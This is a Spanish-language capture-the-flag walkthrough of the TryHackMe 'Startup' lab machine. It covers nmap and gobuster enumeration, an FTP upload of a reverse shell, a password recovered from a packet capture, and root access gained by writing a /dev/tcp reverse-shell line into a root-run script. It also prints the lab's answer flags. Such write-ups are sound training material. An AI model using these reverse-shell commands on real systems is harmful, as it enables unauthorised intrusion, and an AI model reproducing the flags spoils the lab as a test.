# Startup

## Escaneo de puertos

Usamos la herramienta de `nmap` para mapear los puertos abiertos disponibles en la máquina víctima:

```bash
sudo nmap -sV -T4 -p- 10.10.32.165
```

Tenemos tres puertos abiertos.

![](images/image.png)

## Acceso por FTP

Entramos mediante FTP de forma anónima:

![](images/image-1.png)

Nos descargamos los ficheros disponibles:

![](images/image-2.png)

La imagen no parece relevante de momento:

![](images/image-3.png)

Aunque hay un posible usuario en el sistema: `Maya`.

![](images/image-4.png)

## Inspeccionando el servidor web

Accedemos al sitio web:

![](images/image-5.png)

Usamos `gobuster` para identificar posibles directorios ocultos:

```bash
gobuster dir -u http://10.10.32.165 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

Encontramos un directorio llamado `/files`:

![](images/image-6.png)

Accedemos al mismo y vemos el mismo contenido que en FTP:

![](images/image-7.png)

## Reverse Shell

Podemos implantar una reverse shell en este directorio abierto:

![](images/image-8.png)

Abrimos el puerto en escucha:

```bash
nc -lvnp 1234
```

![](images/image-9.png)

Subimos el archivo de la reverse shell vía FTP:

![](images/image-10.png)

Volvemos a la web y en `/files` aparece el archivo:

![](images/image-11.png)

Hacemos clic y se ejecuta, obteniendo acceso:

![](images/image-12.png)

Obtenemos shell más estable:

```bash
bash -i
```

![](images/image-13.png)

Inspeccionamos y encontramos `recipe.txt`:

![](images/image-14.png)

El ingrediente es `love`.

## Análisis de tráfico

Vamos a la carpeta `incidents` y vemos un fichero de Wireshark:

![](images/image-15.png)

Lo descargamos copiándolo a la carpeta accesible en la web:

![](images/image-16.png)
![](images/image-17.png)

![](images/image-18.png)

Seleccionamos cualquier paquete TCP y seguimos el flujo:

![](images/image-19.png)

Encontramos contraseña de `lennie`: `c4ntg3t3n0ughsp1c3`.

![](images/image-20.png)

## Acceso por SSH

Usamos credenciales de `lennie` para SSH:

![](images/image-21.png)

Leemos `user.txt`:

![](images/image-22.png)

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

## Escalada de privilegios

En `/scripts` hay archivos importantes. `planner.sh` es propiedad de root y ejecuta `/etc/print.sh`:

![](images/image-23.png)
![](images/image-24.png)

Subimos `pspy64` a través de FTP para vigilar procesos root:

![](images/image-25.png)

Insertamos reverse shell en `/etc/print.sh`:

```bash
echo "sh -i >& /dev/tcp/10.2.41.173/5555 0>&1" > /etc/print.sh
```

![](images/image-26.png)

Cuando se ejecute el script, obtendremos shell root:

![](images/image-27.png)

Leemos `root.txt`:

```
THM{f963aaa6a430f210222158ae15c3d76d}
```
